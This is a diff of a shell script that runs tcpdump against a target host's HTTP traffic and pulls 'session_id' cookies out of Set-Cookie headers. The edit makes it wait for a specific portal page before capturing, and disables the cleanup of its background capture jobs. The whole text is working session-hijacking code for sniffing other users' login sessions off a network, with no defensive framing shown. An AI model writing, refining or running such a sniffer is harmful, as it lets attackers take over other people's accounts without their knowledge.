@@ -12,13 +12,19 @@ tcpdump -Xvv -i $1 -s 512 -U -w $fifo "tcp port 80 and host $2" 2>/dev/null &
 
 exec 0< $fifo;
 while read line; do
-	cookie=`echo $line | grep -a -oP "(?<=Set-Cookie: session_id=)[0-9a-zA-Z]+"`
+	if [ -z "$flag" ]; then
+		flag=`echo $line | grep "webapps/portal/frameset.jsp"`;
+		if [ -z "$flag" ]; then
+			continue;
+		fi
+	fi
+	cookie=`echo $line | grep -a -oP "(?<=Set-Cookie: session_id=)[0-9a-zA-Z]+"`;
 	if [ -n "$cookie" ]; then
 		break;
 	fi
 done
 
-jobs -pr | xargs -I {} kill -q -9 {};
+# jobs -pr | xargs -I {} kill -9 {} 1>/dev/null 2>/dev/null;
 rm $fifo;
 
 if [ -z $cookie ]; then
